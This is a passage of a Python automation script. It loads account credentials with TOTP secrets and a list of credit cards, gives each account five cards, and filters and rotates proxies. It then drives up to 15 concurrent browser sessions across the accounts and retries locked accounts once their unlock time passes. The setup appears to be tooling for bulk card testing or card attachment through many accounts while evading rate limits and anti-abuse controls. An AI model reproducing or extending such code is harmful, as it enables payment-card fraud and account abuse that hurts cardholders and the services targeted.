                # Get next account (blocks until available)
                account = await account_queue.get()
                logger.info(f"[Worker: {worker_id}] Processing account: {account['email']} (Queue size: {account_queue.qsize()})")
                
                # Assign proxy just-in-time using round-robin pool (thread-safe)
                proxy = None
                if proxy_pool is not None:
                    try:
                        proxy = await proxy_pool.next()
                    except Exception as _e:
                        logger.warning(f"[Worker: {worker_id}] Proxy pool error: {_e}")
                account['proxy'] = proxy
                
                # Log assignment in the same style as before
                if proxy:
                    proxy_info = f"{proxy.get('server','')}"
                    if proxy.get('type') == 2 and proxy.get('username'):
                        proxy_info += f" (auth: {proxy['username']})"
                    print(f"{account['email']} assigned proxy: {proxy_info}")
                else:
                    print(f"{account['email']} no proxy assigned")
                
                # Ensure this account has cards allocated (on-demand)
                await ensure_cards_for_account(account)
                
                # Process the account
                await run_browser_instance(worker_id, position, account, headless, proxy_pool=proxy_pool)
                
                # Mark task as done
                account_queue.task_done()
                
            except Exception as e:
                logger.error(f"[Worker: {worker_id}] Error processing account: {e}")
                # Mark task as done even on error
                account_queue.task_done()
    
    # Create worker tasks
    workers = []
    for i in range(thread_count):
        worker_task = asyncio.create_task(worker(i + 1, positions[i]))
        workers.append(worker_task)
    
    # Run indefinitely: wait on queue to be processed continuously
    await account_queue.join()
    # If join returns (unlikely in infinite loop), cancel workers gracefully
    for worker in workers:
        worker.cancel()
    await asyncio.gather(*workers, return_exceptions=True)

async def main():
    # Get user settings (Docker-aware)
    from config import get_docker_settings

    docker_settings = get_docker_settings()
    if docker_settings:
        headless, thread_count = docker_settings
        logger.info(f"[Docker Mode] Headless: {headless}, Threads: {thread_count or 'auto'}")
    else:
        headless, thread_count = get_user_settings()
    
    # Read accounts, credit cards and proxies from files
    accounts = read_accounts_from_file('list/email.txt')
    cards = read_credit_cards_from_file('list/cc.txt')
    proxies = read_proxies_from_file('list/proxies.txt')
    
    if not accounts:
        logger.error("[Main] No accounts found in list/email.txt")
        return
        
    if not cards:
        logger.error("[Main] No credit cards found in list/cc.txt")
        return
    
    # Use default thread count if not specified
    if thread_count is None:
        thread_count = min(len(accounts), 15)  # Max 15 threads by default
    
    # Assign 5 cards to each account (initial batch)
    accounts = assign_cards_to_accounts(accounts, cards, cards_per_account=5)
    
    # Pre-filter live proxies, then assign to accounts in round-robin
    live_proxies = await filter_live_proxies(proxies)
    # Persist only live proxies back to file (remove dead ones)
    try:
        write_proxies_to_file('list/proxies.txt', live_proxies)
        logger.info(f"[Main] Updated list/proxies.txt with {len(live_proxies)} live proxies")
    except Exception as e:
        logger.error(f"[Main] Failed to update proxies file: {e}")

    # Create a concurrent round-robin proxy pool for workers
    proxy_pool = RoundRobinProxyPool(live_proxies)
    
    # Prepare shared queue and enqueue initial accounts
    account_queue = asyncio.Queue()
    for account in accounts:
        await account_queue.put(account)
    
    async def requeue_from_result_once(account_queue) -> int:
        """Requeue emails from result/email.txt whose unlock time has passed.
        Returns the number of accounts requeued in this pass.
        """
        try:
            # Snapshot current list/email.txt emails to avoid duplicates in file
            current_emails = set()
            try:
                with open('list/email.txt', 'r', encoding='utf-8') as f:
                    for ln in f:
                        ln = ln.strip()
                        if ln and not ln.startswith('ORDER:'):
                            parts = ln.split('|')
                            if len(parts) >= 3:
                                current_emails.add(parts[0])
            except FileNotFoundError:
                pass
            # Read result/email.txt and deduplicate by email keeping the latest unlock time
            try:
                with open('result/email.txt', 'r', encoding='utf-8') as f:
                    res_lines = [ln.strip() for ln in f.readlines() if ln.strip()]
            except FileNotFoundError:
                res_lines = []
            latest = {}
            for ln in res_lines:
                parts = ln.split('|')
                if len(parts) >= 5:
                    email, password, totp, ts, unlock_ts = parts[:5]
                elif len(parts) >= 3:
                    email, password, totp = parts[:3]
                    ts = ''
                    unlock_ts = ''
                else:
                    continue
                prev = latest.get(email)
                if not prev:
                    latest[email] = (email, password, totp, ts, unlock_ts)
                else:
                    _, _, _, _, prev_unlock = prev
                    if unlock_ts and (not prev_unlock or unlock_ts > prev_unlock):
                        latest[email] = (email, password, totp, ts, unlock_ts)
            requeued = 0
            now = datetime.now()
            for email, password, totp, ts, unlock_ts in latest.values():
                if email in current_emails:
                    continue
                ready = False
                if unlock_ts:
                    try:
                        unlock_dt = datetime.strptime(unlock_ts, '%Y-%m-%d %H:%M:%S')
                        ready = unlock_dt <= now
                    except Exception:
                        ready = True
                else:
                    ready = True
                if ready:
                    add_account_to_email_file(email, password, totp)
                    await account_queue.put({'email': email, 'password': password, 'totp_secret': totp})
                    logger.info(f"[System] Re-queued from result (unlock passed): {email}")
                    requeued += 1
            return requeued
        except Exception as e:
            logger.warning(f"[System] Requeue once error: {e}")
            return 0
    
    logger.info(f"[Main] Found {len(accounts)} accounts, {len(cards)} credit cards, {len(proxies)} proxies")
    logger.info(f"[Main] Using {thread_count} threads to process all accounts")
    logger.info(f"[Main] Headless mode: {'ON' if headless else 'OFF'}")
    
    if not headless:
        logger.info(f"[Main] Running {thread_count} browsers in {math.ceil(math.sqrt(thread_count))}x{math.ceil(thread_count/math.ceil(math.sqrt(thread_count)))} grid")
    else:
        logger.info(f"[Main] Running {thread_count} browsers in headless mode")
    
    # Process accounts in rounds: when queue is drained, requeue eligible emails from result and continue; stop if none eligible
    while True:
        await process_accounts_with_queue(account_queue, headless, thread_count, proxy_pool=proxy_pool)
        # Queue drained here; try to requeue eligible emails once
        added = await requeue_from_result_once(account_queue)
        if added == 0:
            break
        else:
            logger.info(f"[Main] Re-queued {added} emails from result; continuing...")
    
    logger.info("[Main] All accounts processed!")

if __name__ == "__main__":
    asyncio.run(main())